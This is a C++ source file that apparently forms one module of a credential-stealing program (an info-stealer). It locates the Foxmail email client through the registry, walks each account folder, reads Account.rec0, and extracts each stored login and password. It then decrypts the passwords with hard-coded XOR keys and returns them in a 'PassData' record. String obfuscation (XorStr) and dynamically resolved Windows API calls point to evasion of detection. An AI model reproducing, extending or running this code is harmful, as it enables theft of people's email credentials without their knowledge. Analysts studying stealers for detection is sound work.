#include "Common.h"

int Foxmail::HexStringToInt(string str)
{
	if (str.size() == 2)
	{
		int result = 0;

		if (str[1] >= 'a' && str[1] <= 'f')
			result += (10 + str[1] - 'a');
		else if (str[1] >= 'A' && str[1] <= 'F')
			result += (10 + str[1] - 'A');
		else
			result += (str[1] - '0');

		if (str[0] >= 'a' && str[0] <= 'f')
			result += 16 * (10 + str[0] - 'a');
		else if (str[0] >= 'A' && str[0] <= 'F')
			result += 16 * (10 + str[0] - 'A');
		else
			result += 16 * (str[0] - '0');

		return result;
	}

	return 0;
}

string Foxmail::FoxmailDecode(bool v, string pHash)
{
	string decodedPassword = string();

	if (!pHash.empty())
	{
		byte hash[] = { '~', 'd', 'r', 'a', 'G', 'o', 'n', '~' };
		int hashSize = 8;
		int fc0 = 0x5A;

		if (v)
		{
			hash[0] = '~';
			hash[1] = 'F';
			hash[2] = '@';
			hash[3] = '7';
			hash[4] = '%';
			hash[5] = 'm';
			hash[6] = '$';
			hash[7] = '~';

			fc0 = 0x71;
		}

		int size = pHash.size() / 2, index = 0;
		vector<byte> ciphered, salt;
		for (int i = 0; i < size; ++i)
		{
			ciphered.push_back((byte)HexStringToInt(pHash.substr(index, 2)));
			index += 2;
		}

		salt.push_back(ciphered[0] ^ fc0);
		for (int i = 1; i < size; ++i)
			salt.push_back(ciphered[i]);

		vector<byte> seq;
		while (ciphered.size() > hashSize)
		{
			for (int i = 0; i < 8; ++i)
				seq.push_back((byte)hash[i]);
			hashSize <<= 1;
		}

		vector<byte> resSeq = vector<byte>(size);
		for (int i = 1; i < size; ++i)
			resSeq[i - 1] = ciphered[i] ^ seq[i - 1];

		for (int i = 0; i < size - 1; ++i)
		{
			if (resSeq[i] - salt[i] < 0)
				decodedPassword += resSeq[i] + 255 - salt[i];
			else
				decodedPassword += resSeq[i] - salt[i];
		}
	}

	return decodedPassword;
}

PassData Foxmail::Grab()
{
	PassData passData;
	HKEY hKey;
	API(ADVAPI32, RegOpenKeyA)(HKEY_LOCAL_MACHINE, XorStr("SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command"), &hKey);
	if (!hKey) return passData;

	string path = string();
	Utils::GetStringRegKeyW(hKey, string(), path, string());
	API(ADVAPI32, RegCloseKey)(hKey);
	if (path.empty()) return passData;

	if (path.rfind('\\') == string::npos) return passData;
	path = path.substr(1, path.rfind('\\'));
	path += XorStr("Storage");

	WIN32_FIND_DATA data;
	HANDLE hFile = API(KERNEL32, FindFirstFileA)((path + XorStr("\\*@*")).c_str(), &data);
	if (hFile == INVALID_HANDLE_VALUE) return passData;
	do
	{
		if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			const string file_name = data.cFileName;
			if (file_name == XorStr(".") || file_name == XorStr(".."))
				continue;

			string eMail = file_name;
			if (!eMail.empty())
			{
				string content = string();
				Utils::ReadAllText(path + '\\' + file_name + XorStr("\\Accounts\\Account.rec0"), content);
				if (content.empty()) return passData;

				bool accfound = false, ver = !(content[0] == 0xD0);
				string buffer = string();

				for (int i = 0; i < content.size(); ++i)
				{
					if (content[i] > 0x20 && content[i] < 0x7F && content[i] != 0x3D)
					{
						buffer += content[i];

						string account = string();
						if (buffer == XorStr("Account") || buffer == XorStr("POP3Account"))
						{
							int index = i + 9;
							if (!ver)
								index = i + 2;

							while (content[index] > 0x20 && content[index] < 0x7F)
							{
								account += content[index];
								++index;
							}

							accfound = true;
							i = index;
						}
						else if (accfound && (buffer == XorStr("Password") || buffer == XorStr("POP3Password")))
						{
							int index = i + 9;
							if (!ver)
								index = i + 2;

							string password = string();
							while (content[index] > 0x20 && content[index] < 0x7F)
							{
								password += content[index];
								++index;
							}

							passData.Soft = XorStr("Foxmail");
							passData.Login = eMail;
							passData.Pass = FoxmailDecode(ver, password);

							i = index; // some questions
							break;
						}
					}
					else
						buffer = string();
				}
			}
		}
	} while (API(KERNEL32, FindNextFileA)(hFile, &data));
	API(KERNEL32, FindClose)(hFile);

	return passData;
}